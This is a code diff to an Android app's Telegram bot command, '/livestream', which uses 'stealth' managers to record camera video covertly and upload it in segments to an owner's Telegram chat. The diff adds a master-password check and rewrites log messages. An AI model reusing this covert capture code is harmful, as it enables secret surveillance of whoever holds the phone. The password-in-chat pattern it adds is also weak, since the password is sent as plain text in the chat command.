@@ -8,6 +8,7 @@ import com.izhaanintellect.pasa.camera.StealthCaptureBridge
 import com.izhaanintellect.pasa.camera.StealthVideoManager
 import com.izhaanintellect.pasa.data.PreferencesManager
 import com.izhaanintellect.pasa.network.PasaBackendApi
+import com.izhaanintellect.pasa.security.AuthManager
 import dagger.hilt.android.qualifiers.ApplicationContext
 import kotlinx.coroutines.*
 import okhttp3.MediaType.Companion.toMediaTypeOrNull
@@ -34,7 +35,8 @@ class LiveStreamCommand @Inject constructor(
     private val preferencesManager: PreferencesManager,
     private val telegramApi: TelegramApi,
     private val pasaBackendApi: PasaBackendApi,
-    private val stealthVideoManager: StealthVideoManager
+    private val stealthVideoManager: StealthVideoManager,
+    private val authManager: AuthManager
 ) : Command {
 
     override val name = "/livestream"
@@ -54,6 +56,26 @@ class LiveStreamCommand @Inject constructor(
     }
 
     override suspend fun execute(args: List<String>, chatId: Long): CommandResult {
+        // SECURITY: Require authentication for this sensitive operation
+        val password = args.firstOrNull()
+        if (password.isNullOrBlank() || !authManager.verifyMasterPassword(password)) {
+            return CommandResult(
+                success = false,
+                message = """
+                    🔐 <b>Authentication Required</b>
+                    ━━━━━━━━━━━━━━━━━━━━
+                    This sensitive operation requires your master password.
+
+                    <b>Usage:</b>
+                    <code>/livestream &lt;password&gt; [front|back] [duration]</code>
+
+                    <b>Examples:</b>
+                    <code>/livestream mypassword front 5</code>
+                    <code>/livestream mypassword back 10</code>
+                """.trimIndent()
+            )
+        }
+
         if (isStreaming.get()) {
             return CommandResult(
                 success = false,
@@ -61,11 +83,11 @@ class LiveStreamCommand @Inject constructor(
             )
         }
 
-        // Parse arguments
+        // Parse arguments (skip password which is args[0])
         var useFront = true
         var durationMinutes = DEFAULT_DURATION_MINUTES
 
-        for (arg in args) {
+        for (arg in args.drop(1)) {
             when (arg.lowercase()) {
                 "front" -> useFront = true
                 "back", "rear" -> useFront = false
@@ -135,16 +157,16 @@ class LiveStreamCommand @Inject constructor(
                             val chatId = preferencesManager.ownerChatIdLong
 
                             if (botToken.isBlank()) {
-                                Log.e(TAG, "❌ LIVESTREAM FAILED: Bot token not configured. Run /smssetup to configure.")
+                                Log.e(TAG, "Bot configuration missing - livestream requires setup")
                                 consecutiveFailures = 999 // Force stop
                                 delay(2000)
                             } else if (chatId == 0L) {
-                                Log.e(TAG, "❌ LIVESTREAM FAILED: Owner chat ID not set. Unable to send videos.")
+                                Log.e(TAG, "Owner chat ID not configured - unable to send videos")
                                 consecutiveFailures = 999 // Force stop
                                 delay(2000)
                             } else {
                                 // Direct Telegram dispatch (Strategy 1: Zero-Storage, zero server media persistence)
-                                Log.i(TAG, "📤 Uploading segment $segNum (${ videoFile.length() / 1024 }KB) to Telegram...")
+                                Log.i(TAG, "Uploading segment $segNum (${videoFile.length() / 1024}KB) to Telegram")
 
                                 val mediaType = "video/mp4".toMediaTypeOrNull()
                                 val requestBody = videoFile.asRequestBody(mediaType)
